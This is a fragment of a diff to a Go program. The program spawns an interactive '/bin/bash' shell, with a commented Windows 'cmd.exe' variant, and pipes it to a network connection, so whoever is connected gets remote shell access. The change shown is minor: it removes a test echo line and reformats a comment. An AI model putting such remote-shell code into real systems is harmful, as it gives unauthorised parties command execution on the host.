@@ -53,14 +53,13 @@ func main() {
 				defer conn.Close()
 				cmd := exec.Command("/bin/bash", "-i") // open bash in interactive mode for linux
 				// for windows:
-				// cmd := exec.Command("cmd.exe")
+				//cmd := exec.Command("cmd.exe")
 
 				// redirect this cmd in and out to client
 				cmd.Stdin = conn
 				//handleSimply(&conn, cmd)
 				//handleByFlusher(&conn, cmd)
 				handleByPipes(&conn, cmd)
-				conn.Write([]byte("echo test me\n"))
 				// run
 				if err = cmd.Run(); err != nil {
 					log.Fatalln(err)
